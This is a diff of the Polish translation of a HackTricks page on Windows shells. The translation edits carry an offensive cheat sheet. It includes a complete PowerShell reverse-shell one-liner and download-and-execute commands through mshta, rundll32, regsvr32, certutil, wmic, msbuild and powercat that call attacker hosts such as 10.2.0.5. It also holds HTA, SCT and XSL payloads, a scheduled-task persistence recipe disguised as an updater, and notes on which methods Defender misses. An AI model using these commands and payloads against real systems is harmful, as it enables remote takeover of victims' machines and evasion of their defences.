@@ -1,11 +1,11 @@
-# Powłoki - Windows
+# Shells - Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Lolbas
 
-Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest dla Windows podobnie jak [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla linux.\
-Oczywiście, **nie ma plików SUID ani uprawnień sudo w Windows**, ale warto wiedzieć **jak** niektóre **binaries** mogą być (ab)użyte do wykonania pewnych nieoczekiwanych działań, takich jak **execute arbitrary code.**
+Strona [lolbas-project.github.io](https://lolbas-project.github.io/) jest odpowiednikiem dla Windows tego, czym [https://gtfobins.github.io/](https://gtfobins.github.io/) jest dla Linux.\
+Oczywiście, **w Windows nie ma plików SUID ani uprawnień sudo**, ale warto wiedzieć, **jak** niektóre **binaries** mogą być (niewłaściwie) używane do wykonywania pewnego rodzaju nieoczekiwanych działań, takich jak **execute arbitrary code.**
 
 ## NC
 ```bash
@@ -27,7 +27,7 @@ ncat -l <PORT eg.443> --ssl
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) jest przenośną i bezpieczną alternatywą dla Netcat**. Działa na systemach typu Unix oraz Win32. Dzięki funkcjom takim jak silne szyfrowanie, uruchamianie programów, możliwość dostosowania portów źródłowych oraz automatyczne ponowne łączenie, sbd zapewnia wszechstronne rozwiązanie do komunikacji TCP/IP. Dla użytkowników Windows, wersja sbd.exe z dystrybucji Kali Linux może być użyta jako niezawodny zamiennik Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) to przenośna i bezpieczna alternatywa dla Netcat**. Działa w systemach uniksowych i Win32. Dzięki funkcjom takim jak silne szyfrowanie, wykonywanie programów, możliwość dostosowania portów źródłowych oraz ciągłe ponowne nawiązywanie połączenia, sbd zapewnia wszechstronne rozwiązanie do komunikacji TCP/IP. Użytkownicy Windows mogą korzystać z wersji sbd.exe z dystrybucji Kali Linux jako niezawodnego zamiennika Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -60,7 +60,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## OpenSSH
 
-Atakujący (Kali)
+Napastnik (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -81,15 +81,15 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Proces wykonujący połączenie sieciowe: **powershell.exe**\
-Payload zapisany na dysku: **NIE** (_przynajmniej nigdzie, gdzie mogłem znaleźć używając procmon!_)
+Proces wykonujący wywołanie sieciowe: **powershell.exe**\
+Ładunek zapisany na dysku: **NO** (_przynajmniej nigdzie, gdzie udało mi się go znaleźć przy użyciu procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Proces wykonujący połączenie sieciowe: **svchost.exe**\
-Payload zapisany na dysku: **WebDAV client local cache**
+Proces wykonujący wywołanie sieciowe: **svchost.exe**\
+Payload zapisany na dysku: **lokalna pamięć podręczna klienta WebDAV**
 
-Jednolinijkowe polecenie:
+**One liner:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -97,7 +97,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $c
 
 ## Mshta
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
@@ -109,15 +109,15 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Przykład hta-psh reverse shell (użyj hta do pobrania i uruchomienia PS backdoor)**
+#### **Przykład reverse shell hta-psh (użycie hta do pobrania i wykonania backdoora PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Możesz bardzo łatwo pobrać i uruchomić zombie Koadic używając stagera hta**
+**Możesz bardzo łatwo pobrać i uruchomić Koadic zombie za pomocą stagera hta**<sup>[[3]](#references)</sup>
 
 #### przykład hta
 
-[**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+[**Stąd**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)<sup>[[7]](#references)</sup>
 ```xml
 <html>
 <head>
@@ -134,7 +134,7 @@ new ActiveXObject('WScript.Shell').Run(c);
 ```
 #### **mshta - sct**
 
-[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Stąd**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -161,13 +161,13 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Wykryte przez Defendera**
+**Wykrywane przez defendera**
 
 ## **Rundll32**
 
-[**Przykład DLL hello world**](https://github.com/carterjones/hello-world-dll)
+[**Przykład hello world dla Dll**](https://github.com/carterjones/hello-world-dll)
 
-- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
@@ -175,11 +175,11 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Wykryte przez Defender**
+**Wykrywane przez defendera**
 
 **Rundll32 - sct**
 
-[**From here**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Stąd**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -211,7 +211,7 @@ rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject(
 ```
 ## Regsvr32
 
-- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
@@ -219,14 +219,14 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Wykrywane przez Defendera**
+**Wykrywane przez defendera**
 
-#### Regsvr32 – dowolny eksport funkcji DLL z argumentem /i (gatekeeping & persistence)
+#### Regsvr32 – dowolny export DLL z argumentem /i (gatekeeping i persistence)
 
-Poza ładowaniem zdalnych scriptletów (`scrobj.dll`), `regsvr32.exe` załaduje lokalny DLL i wywoła jego eksporty `DllRegisterServer`/`DllUnregisterServer`. Własne ładowarki często nadużywają tego, by wykonać dowolny kod, maskując się jako podpisany LOLBin. Dwie obserwowane w praktyce wskazówki:
+Oprócz ładowania zdalnych scriptletów (`scrobj.dll`), `regsvr32.exe` załaduje lokalny DLL i wywoła jego eksporty `DllRegisterServer`/`DllUnregisterServer`. Custom loadery często nadużywają tego mechanizmu do wykonywania dowolnego kodu, jednocześnie podszywając się pod podpisany LOLBin. W praktyce zaobserwowano dwie uwagi dotyczące tradecraftu:<sup>[[6]](#references)</sup>
 
-- Gatekeeping argument: DLL kończy działanie, chyba że przez `/i:<arg>` zostanie przekazany konkretny przełącznik, np. `/i:--type=renderer` żeby upodobnić się do procesów renderer Chromium. To zmniejsza przypadkowe uruchomienia i utrudnia analizę w sandboxach.
-- Persistence: schedule `regsvr32` to run the DLL with silent + high privileges and the required `/i` argument, masquerading as an updater task:
+- Argument gatekeepingu: DLL kończy działanie, chyba że przekazano konkretny switch przez `/i:<arg>`, np. `/i:--type=renderer`, aby imitować procesy potomne renderera Chromium. Ogranicza to przypadkowe wykonanie i utrudnia działanie sandboxów.
+- Persistence: zaplanuj uruchamianie `regsvr32` w celu wykonania DLL z opcją silent + wysokimi uprawnieniami oraz wymaganym argumentem `/i`, podszywając się pod task aktualizatora:
 ```powershell
 Register-ScheduledTask \
 -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
@@ -237,13 +237,13 @@ Register-ScheduledTask \
 -RunLevel Highest
 ```
 
-Zobacz także: wariant ClickFix clipboard‑to‑PowerShell, który przygotowuje JS loader i później utrwala się przy użyciu `regsvr32`.
+Zobacz także: wariant ClickFix clipboard‑to‑PowerShell, który umieszcza JS loader, a następnie utrwala się za pomocą `regsvr32`.
 {{#ref}}
 ../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
 {{#endref}}
 
 
-[**Stąd**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+[**Stąd**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)<sup>[[9]](#references)</sup>
 ```html
 <?XML version="1.0"?>
 <!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
@@ -269,21 +269,21 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Możesz bardzo łatwo pobrać i uruchomić Koadic zombie używając stagera regsvr**
+**Możesz bardzo łatwo pobrać i uruchomić zombie Koadic za pomocą stagera regsvr**<sup>[[3]](#references)</sup>
 
 ## Certutil
 
-- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 
 Pobierz B64dll, zdekoduj ją i uruchom.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Pobierz B64exe, zdekoduj go i uruchom.
+Pobierz B64exe, zdekoduj go i wykonaj.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Wykryte przez Defendera**
+**Wykryte przez obrońcę**
 
 ## **Cscript/Wscript**
 ```bash
@@ -309,7 +309,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Wykryte przez Defender**
+**Wykryte przez obrońcę**
 
 ## **MSIExec**
 
@@ -322,15 +322,15 @@ Ofiara:
 ```
 victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```
-**Wykryte**
+**Wykryto**
 
 ## **Wmic**
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Przykładowy plik xsl [from here](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Przykładowy plik xsl [stąd](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):<sup>[[10]](#references)</sup>
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -342,52 +342,52 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 </ms:script>
 </stylesheet>
 ```
-**Nie wykryto**
+**Niewykrywane**
 
-**Możesz bardzo łatwo download & execute Koadic zombie używając stager wmic**
+**Możesz bardzo łatwo pobrać i wykonać zombie Koadic przy użyciu stagera wmic**<sup>[[3]](#references)</sup>
 
 ## Msbuild
 
-- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Możesz użyć tej techniki, aby obejść Application Whitelisting i ograniczenia Powershell.exe. Zostaniesz poproszony o uruchomienie PS shell.\
-Po prostu pobierz to i uruchom: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
+Możesz użyć tej techniki, aby obejść Application Whitelisting i ograniczenia dotyczące Powershell.exe. Zostanie wyświetlona powłoka PS.\
+Po prostu pobierz to i wykonaj: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**Nie wykryto**
+**Niewykryte**
 
 ## **CSC**
 
-Skompiluj kod C# na maszynie ofiary.
+Skompiluj kod C# na komputerze ofiary.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Możesz pobrać podstawowy C# reverse shell stąd: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Możesz pobrać podstawowy reverse shell w C# stąd: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
-**Niewykrywalne**
+**Nie wykryto**
 
 ## **Regasm/Regsvc**
 
-- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
 ```
-**Nie testowałem tego**
+**Nie próbowałem tego**
 
-[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)
+[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)<sup>[[2]](#references)</sup>
 
 ## Odbcconf
 
-- [Stąd](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [Tutaj](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
 ```bash
 odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
-**Nie próbowałem tego**
+**Nie testowałem tego**
 
-[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
+[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)<sup>[[2]](#references)</sup>
 
 ## Powershell Shells
 
@@ -395,27 +395,27 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-W folderze **Shells** znajduje się wiele różnych typów. Aby pobrać i uruchomić Invoke-_PowerShellTcp.ps1_ skopiuj skrypt i dopisz na końcu pliku:
+W folderze **Shells** znajduje się wiele różnych shells. Aby pobrać i wykonać plik _Invoke-PowerShellTcp.ps1_, utwórz kopię skryptu i dopisz na końcu pliku:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Rozpocznij serwowanie skryptu na serwerze WWW i uruchom go po stronie ofiary:
+Uruchom udostępnianie skryptu na serwerze WWW i wykonaj go po stronie ofiary:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender nie wykrywa go jako złośliwego kodu (jeszcze, 3/04/2019).
 
-**TODO: Sprawdź inne shelle nishang**
+**TODO: Sprawdź inne shells z nishang**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Pobierz, uruchom serwer WWW, uruchom listener i wykonaj go po stronie ofiary:
+Pobierz, uruchom web server, uruchom listener i wykonaj to po stronie ofiary:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender nie wykrywa tego jako malicious code (jeszcze, 3/04/2019).
+Defender nie wykrywa tego jako złośliwego kodu (jeszcze, 3/04/2019).
 
 **Inne opcje oferowane przez powercat:**
 
@@ -440,7 +440,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Stwórz powershell launcher, zapisz go w pliku, pobierz i uruchom.
+Utwórz PowerShell launcher, zapisz go w pliku, a następnie pobierz i wykonaj.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -450,15 +450,15 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Utwórz wersję powershell backdoor metasploit przy użyciu unicorn
+Utwórz wersję backdoora Metasploit w PowerShellu przy użyciu Unicorn.
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Uruchom msfconsole z utworzonym resource:
+Uruchom msfconsole z utworzonym plikiem resource:
 ```
 msfconsole -r unicorn.rc
 ```
-Uruchom serwer WWW serwujący plik _powershell_attack.txt_ i uruchom go na maszynie ofiary:
+Uruchom serwer WWW udostępniający plik _powershell_attack.txt_ i wykonaj na hoście ofiary:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -466,19 +466,21 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Więcej
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) konsola PS z kilkoma preładowanymi ofensywnymi modułami PS (zaszyfrowane)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) konsola PS z załadowanymi modułami ofensywnymi PS (zaszyfrowana)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
-WinPWN](https://github.com/SecureThisShit/WinPwn) konsola PS z kilkoma ofensywnymi modułami PS i wykrywaniem proxy (IEX)
+[WinPWN](https://github.com/SecureThisShit/WinPwn) konsola PS z niektórymi ofensywnymi modułami PS i wykrywaniem proxy (IEX)
 
-## Źródła
+## Referencje
 
-- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
-- [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
-- [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
-- [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
-- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [GitHub Gists Arno0x](https://gist.github.com/Arno0x)
+- [3] [Koadic – framework Command & Control oparty na COM](https://www.hackingarticles.in/koadic-com-command-control-framework/)
+- [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [Windows Oneliners do pobierania zdalnego payloadu i wykonywania dowolnego kodu](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
+- [6] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [7] [calc.hta – przykład reverse execution HTA (gist Arno0x)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
+- [8] [scriptlet.sct – przykład scriptletu mshta/rundll32 (gist Arno0x)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+- [9] [regsvr32.sct – przykład scriptletu Regsvr32 (gist Arno0x)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
+- [10] [wmic.xsl – przykład arkusza stylów WMIC XSL (gist Arno0x)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
 
 {{#include ../../banners/hacktricks-training.md}}
